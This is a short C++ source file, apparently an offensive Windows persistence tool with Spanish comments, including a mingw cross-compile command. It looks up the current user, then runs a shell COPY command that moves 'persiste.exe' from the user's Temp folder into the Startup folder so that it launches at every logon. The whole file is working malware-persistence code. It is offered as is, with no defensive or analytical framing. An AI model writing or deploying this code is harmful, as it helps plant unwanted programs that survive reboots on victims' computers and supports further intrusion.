
		#include <iostream>
		#include <windows.h>
		#include <string>
		#pragma comment(lib, "urlmon.lib")
		#include <lmcons.h>
		#include <cstring>
		#define ORIGENARCHIVO "persiste.exe"
		#define DESTINOPATH "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
		using namespace std;
		//compilar: i686-w64-mingw32-g++ persiste.cpp -o persiste -static-libgcc -static-libstdc++

		int main(void){
			char username[UNLEN+1];
			DWORD username_len = UNLEN+1;
			GetUserName(username, &username_len);
			string user(username);
			string file_name = ORIGENARCHIVO;
			string origen_path = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\" + file_name;
			string destino_path = "C:\\Users\\" + user + "\\" + DESTINOPATH;
			string cmd = "COPY \"" +  origen_path + "\" \"" + destino_path + "\"";
			//printf("CMD: %s", cmd.c_str());
			system(cmd.c_str());

		}
		